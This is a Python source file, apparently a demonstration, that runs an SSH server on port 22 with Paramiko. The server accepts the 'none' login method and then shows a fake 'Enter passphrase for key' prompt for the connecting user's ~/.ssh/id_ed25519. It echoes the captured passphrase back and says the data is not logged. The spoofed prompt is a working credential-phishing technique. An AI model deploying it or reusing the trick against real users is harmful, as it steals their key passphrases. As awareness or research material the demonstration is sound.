# Inspired by Paramiko server demo (https://github.com/paramiko/paramiko/blob/master/demos/demo_server.py)

import socketserver
import paramiko
import threading
import traceback

class SusServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_none(self, username):
        self.sent_username = username
        return paramiko.AUTH_SUCCESSFUL

    def get_allowed_auths(self, username):
        return "none"

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True


def build_sus_tcp_handler(host_key):
    class SusTCPHandler(socketserver.BaseRequestHandler):
        def handle(self):
            try:
                transport = paramiko.Transport(self.request)
                transport.add_server_key(host_key)
                server = SusServer()
                transport.start_server(server=server)

                channel = transport.accept(20)
                if channel is None:
                    raise Exception('No channel')

                server.event.wait(10)
                if not server.event.is_set():
                    raise Exception('No shell')

                channel.send(f"Enter passphrase for key '/Users/{server.sent_username}/.ssh/id_ed25519': ")

                f = channel.makefile("rU")

                passphrase = f.readline().strip("\r\n")
                channel.send(f"\r\nI'm the server, and your passphrase is: {passphrase}\r\n")
                channel.send("\r\nThis data isn't logged. Press any key to exit.\r\n")

                f.read(size=1)

                channel.close()
            except Exception as e:
                traceback.print_exc()
            finally:
                transport.close()


    return SusTCPHandler

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass

if __name__ == '__main__':
    HOST, PORT, HOST_KEY_FILENAME = '0.0.0.0', 22, 'host.key'
    host_key = paramiko.RSAKey(filename=HOST_KEY_FILENAME)
    SusTCPHandler = build_sus_tcp_handler(host_key)
    server = ThreadedTCPServer((HOST, PORT), SusTCPHandler)
    server.serve_forever()
